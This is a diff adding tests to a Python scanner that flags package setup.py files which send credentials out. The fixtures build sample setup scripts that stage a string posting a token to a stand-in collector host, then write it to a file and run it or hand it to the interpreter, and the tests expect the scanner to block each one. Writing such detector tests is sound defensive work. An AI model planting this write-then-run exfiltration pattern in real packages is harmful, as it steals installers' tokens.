@@ -83,3 +83,60 @@ class TestACallNamedInAString:
             + "setup(name='demo-guard', version='1.0.0')\n"
         )
         assert Package.sends_a_credential(Package.sdist(tmp_path, setup))
+
+
+class TestAStringThatReachesASink:
+    """A string is text only while nothing sends it, runs it or writes it out. One written to a
+    file and run is the first half of write-then-run, and `InertLiterals` keeps a write a sink for
+    the same reason. The first form of the drop read every string of a file that never calls `exec`
+    as text, and a malicious unit of the PyPI development half that stages its callback this way
+    lost its block (final-tree pair, 2026-11-16, reviews/mcp-98/17)."""
+
+    STAGE = (
+        "stage = \"import requests; requests.post('https://collector.example.invalid/c', "
+        'data=token)"\n'
+    )
+
+    def test_a_string_written_to_a_file_and_run_is_still_blocked(self, tmp_path):
+        setup = (
+            TABLE
+            + "import subprocess, sys\n"
+            + self.STAGE
+            + "open('stage.py', 'w').write(stage)\n"
+            + "subprocess.run([sys.executable, 'stage.py'])\n"
+            + "setup(name='demo-guard', version='1.0.0')\n"
+        )
+        assert Package.sends_a_credential(Package.sdist(tmp_path, setup))
+
+    def test_a_string_handed_to_an_interpreter_is_still_blocked(self, tmp_path):
+        setup = (
+            TABLE
+            + "import subprocess, sys\n"
+            + self.STAGE
+            + "subprocess.run([sys.executable, '-c', stage])\n"
+            + "setup(name='demo-guard', version='1.0.0')\n"
+        )
+        assert Package.sends_a_credential(Package.sdist(tmp_path, setup))
+
+    def test_a_string_handed_to_a_helper_that_writes_it_is_still_blocked(self, tmp_path):
+        setup = (
+            TABLE
+            + "import subprocess, sys\n"
+            + "def stash(text):\n"
+            + "    with open('stage.py', 'w') as handle:\n"
+            + "        handle.write(text)\n"
+            + self.STAGE
+            + "stash(stage)\n"
+            + "subprocess.run([sys.executable, 'stage.py'])\n"
+            + "setup(name='demo-guard', version='1.0.0')\n"
+        )
+        assert Package.sends_a_credential(Package.sdist(tmp_path, setup))
+
+    def test_a_table_that_only_a_loop_reads_is_still_text(self, tmp_path):
+        setup = (
+            TABLE
+            + "for call in WATCHED_CALLS:\n"
+            + "    print(len(call))\n"
+            + "setup(name='demo-guard', version='1.0.0')\n"
+        )
+        assert not Package.sends_a_credential(Package.sdist(tmp_path, setup))
